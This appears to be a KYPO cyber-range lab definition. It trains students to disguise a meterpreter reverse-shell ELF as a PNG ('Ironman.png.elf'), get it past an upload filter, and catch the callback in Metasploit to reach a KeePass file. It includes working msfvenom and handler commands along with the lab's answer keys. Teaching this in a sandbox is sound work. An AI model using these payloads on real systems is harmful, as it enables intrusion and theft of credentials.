{
  "title" : "Creating Infectious Media",
  "description" : null,
  "prerequisites" : [ ],
  "outcomes" : [ ],
  "state" : "UNRELEASED",
  "show_stepper_bar" : true,
  "levels" : [ {
    "title" : "Introduction level",
    "level_type" : "INFO_LEVEL",
    "order" : 0,
    "estimated_duration" : 0,
    "minimal_possible_solve_time" : null,
    "content" : "Welcome to the KYPO platform. We've prepared training composed of multiple types of levels. In training levels, you need to read an assignment and find an answer to process to the next level."
  }, {
    "title" : "Get Access",
    "level_type" : "ACCESS_LEVEL",
    "order" : 1,
    "estimated_duration" : 0,
    "minimal_possible_solve_time" : null,
    "passkey" : "start",
    "cloud_content" : "Your first task is to access the sandbox, where you will complete all following tasks. After you have successfully connected, Submit the answer **`start`**.\n\n## Sandbox GUI access\n\n1. Download the SSH access zip file from Training Level of the Linear Training Run page with topology visualization (in case of Adaptive Training Run, download it from the Training Phase).\n\n2. Extract the ssh-access.zip file to the ~/.ssh/ directory:\n\n>> `$ unzip ssh-access.zip -d ~/.ssh/`\n\n> Extracted files:\n> \n> >     ~/.ssh/pool-id-ID-sandbox-id-ID-user-config: the SSH configuration file.\n> >     ~/.ssh/pool-id-ID-sandbox-id-ID-user-key: the sandbox user SSH private key.\n> >     ~/.ssh/pool-id-ID-sandbox-id-ID-user-key.pub: the sandbox user SSH public key.\n\n3. Copy content in the file **`pool-id-ID-sandbox-id-ID-user-config`** to the file **`~/.ssh/config`** (if the file is not exist, create one) \n4. Run this command:\n\n>> `$ ssh -L 5901:localhost:5901 -N -i pool-id-ID-sandbox-id-ID-user-key user@client`\n\n5. Install any VNCviewr (You can refer to this [site](https://linuxhint.com/install-realvnc-vnc-viewer-linux/)) then connect to **`localhost:5901`** with password is \"**`password`**\"\n\n## Sandbox SSH access\n- Do the first 2 step as instruction above. Connect directly to any virtual machine using SSH protocol:\n\n>> `$ ssh -F ~/.ssh/pool-id-ID-sandbox-id-ID-user-config <vm_name>`\n\n>> the **`<vm_name>`** can be **`user@client`** or **`user@server`** or any other.\n\n**`Note:`**\n- You can found browser, wireshark or another app by click on the **Applications button** in the top left of the screen\n- Use **firefox** in **Internet** instead of using default web browser\n\nAlternatively, you can use SSH to connect to the machine. SSH access makes it easier to copy-paste commands and flags, but requires more steps to set up. See [documentation](https://docs.crp.kypo.muni.cz/user-guide-advanced/sandboxes/sandbox-access/#user-access) for more details.",
    "local_content" : "Before proceeding further, you need to start a sandbox on your machine. \nPlease clone [this Gitlab repository](https://<link_to_a_repo>) and follow steps in the README file.\nWhen your sandbox is ready at your host, submit the passkey from the README file."
  }, {
    "title" : "Bypass upload restrict",
    "level_type" : "TRAINING_LEVEL",
    "order" : 2,
    "estimated_duration" : 5,
    "minimal_possible_solve_time" : 2,
    "answer" : "Ironman.png.elf",
    "answer_variable_name" : null,
    "content" : "As you remember, from the last time we found SQL injection on student management,We already know that someone really wants to download Iron man on the download page.So, this is our opportunity to trick her for download a malicious file with the name is **`Ironman`** that contains a reverse shell payload.\n\nBut you may find that you cannot upload files with extensions other than png, jpg, gif, ... Try to figure it out how to bypass that.\n\nThe answer for this level is the name of the file (it must be look like an png file, and it also should be an elf file type).",
    "solution" : "Ironman.png.elf",
    "solution_penalized" : true,
    "hints" : [ {
      "title" : "How can they restrict which file can upload ?",
      "content" : "* Validate file types. Only allow users to upload files of certain types, such as images, documents, and videos. This will prevent users from uploading malicious files, such as scripts or executables.\n\n* Limit file size. Set a maximum file size that users can upload. This will help to prevent users from uploading large files that could overload the server.\n\n* Restrict file names. Do not allow users to use certain characters in file names, such as spaces, underscores, or periods or check it extension to see if it match the whitelist. This will help to prevent users from creating malicious file names that could be used to bypass security restrictions.\n\n* Store uploaded files in a secure location. The directory where uploaded files are stored should be outside of the web root directory. This will prevent attackers from accessing the files directly via the web browser.\n\n* Use a file upload filter. A file upload filter is a software program that can be used to scan uploaded files for malicious content. This can help to prevent attackers from uploading files that contain viruses or other malware.",
      "hint_penalty" : 20,
      "order" : 0
    }, {
      "title" : "How to bypass ?",
      "content" : "What if they check extension of the file instead of mime type ?\nIf that, what if they just simply split the file name by the dot '.' and check the second part of it with the white list ?",
      "hint_penalty" : 20,
      "order" : 1
    } ],
    "incorrect_answer_limit" : 5,
    "attachments" : [ ],
    "max_score" : 100,
    "variant_answers" : false,
    "reference_solution" : [ ],
    "mitre_techniques" : [ ],
    "expected_commands" : [ ],
    "commands_required" : true
  }, {
    "title" : "Generate the Reverse Shell Payload",
    "level_type" : "TRAINING_LEVEL",
    "order" : 3,
    "estimated_duration" : 5,
    "minimal_possible_solve_time" : 2,
    "answer" : "192.168.30.5",
    "answer_variable_name" : null,
    "content" : "# Execute the following command to generate the reverse shell payload using msfvenom:\n\n`sudo msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<LHOST IP address> LPORT=<PORT> -f elf -o Ironman.png.elf`\n\n# Explain:\n-p: Specifies the payload to use for generating the shellcode. In this case, linux/x64/meterpreter_reverse_tcp is the payload, which is a reverse TCP meterpreter payload for 64-bit Linux systems.\n\nLHOST: This is a variable that represents your IP address. It should be replaced with your actual IP address.\n\nLPORT: This is a variable that represents the port number on which the meterpreter will listen for incoming connections. It should be replaced with the desired port number. My recommend is using the uncommon PORT.\n\n-f: Specifies the output format of the payload. In this case, elf is the format, which stands for Executable and Linkable Format, commonly used for Linux executables.\n\n-o: Specifies the output file where the generated payload will be saved. In this case, the payload will be saved in the file /var/www/html/shell-x64.elf. The /var/www/html/ directory is often used for serving web content, so this would make the payload accessible via a web server if it's running on the system.\n\n### Question: What is the value of LHOST IP address ?",
    "solution" : "192.168.30.5",
    "solution_penalized" : true,
    "hints" : [ ],
    "incorrect_answer_limit" : 3,
    "attachments" : [ ],
    "max_score" : 100,
    "variant_answers" : false,
    "reference_solution" : [ ],
    "mitre_techniques" : [ ],
    "expected_commands" : [ ],
    "commands_required" : true
  }, {
    "title" : "Configure Metasploit for Reverse Shell Handling",
    "level_type" : "TRAINING_LEVEL",
    "order" : 4,
    "estimated_duration" : 10,
    "minimal_possible_solve_time" : 3,
    "answer" : "Secret_keepass.kdb",
    "answer_variable_name" : null,
    "content" : "# Run Metasploit console by command msfconsole, execute the following commands:\n\n`use exploit/multi/handler`\n\n`set PAYLOAD linux/x64/meterpreter_reverse_tcp`\n\n`set LPORT <PORT>`\n\n`set LHOST <IP address>`\n\n# Explain:\nuse exploit/multi/handler: This command sets the current context to use the 'exploit/multi/handler' module. This module is responsible for setting up a listener to catch incoming connections from exploited targets.\n\nset PAYLOAD linux/x64/meterpreter_reverse_tcp: This command sets the payload to be used in the exploit to 'linux/x64/meterpreter_reverse_tcp'. It specifies the type of payload that will be delivered to the target system.\n\nset LPORT <PORT>: This command sets the local port (LPORT) for the listener. It specifies the port on which the Metasploit handler will listen for incoming connections from exploited systems.\n\nset LHOST <IP address>: This command sets the local host (LHOST) for the listener. It specifies the IP address of the machine where the Metasploit handler is running.\n\n**`You might have already know:`**\n\n1. Type **`download <path_to_file>`** in meterpreter shell to Download a file or directory\n2. Type **`shell`** in meterpreter shell to Drop into a system command shell.\n3. Using this command to get interactive shell: **`python3 -c 'import pty; pty.spawn(\"/bin/bash\")'`**\n\n\n## Q: What is another file in the directory that you access to ?",
    "solution" : "Secret_keepass.kdb",
    "solution_penalized" : true,
    "hints" : [ ],
    "incorrect_answer_limit" : 5,
    "attachments" : [ ],
    "max_score" : 100,
    "variant_answers" : false,
    "reference_solution" : [ ],
    "mitre_techniques" : [ ],
    "expected_commands" : [ ],
    "commands_required" : true
  } ],
  "estimated_duration" : 20,
  "variant_sandboxes" : false
}